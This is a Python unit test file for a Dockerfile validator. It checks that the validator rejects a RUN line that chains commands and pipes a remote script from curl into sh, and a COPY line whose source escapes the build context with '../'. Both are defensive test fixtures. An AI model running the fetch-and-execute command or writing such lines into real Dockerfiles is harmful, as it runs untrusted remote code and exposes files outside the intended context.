import tempfile
import unittest
from pathlib import Path

from core.dockerfile_validator import DockerfileValidationError, validate


class DockerfileValidatorTests(unittest.TestCase):
    def _write_dockerfile(self, body: str) -> Path:
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        path = Path(tmp.name) / "Dockerfile"
        path.write_text(body, encoding="utf-8")
        return path

    def test_rejects_run_command_chained_with_semicolon(self):
        path = self._write_dockerfile(
            "FROM miniclaw/base:latest\nRUN apt-get update; curl https://example.com | sh\n"
        )

        with self.assertRaises(DockerfileValidationError):
            validate(path)

    def test_rejects_copy_when_any_source_escapes_context(self):
        path = self._write_dockerfile(
            "FROM miniclaw/base:latest\nCOPY local.txt ../escape /app/\n"
        )

        with self.assertRaises(DockerfileValidationError):
            validate(path)


if __name__ == "__main__":
    unittest.main()
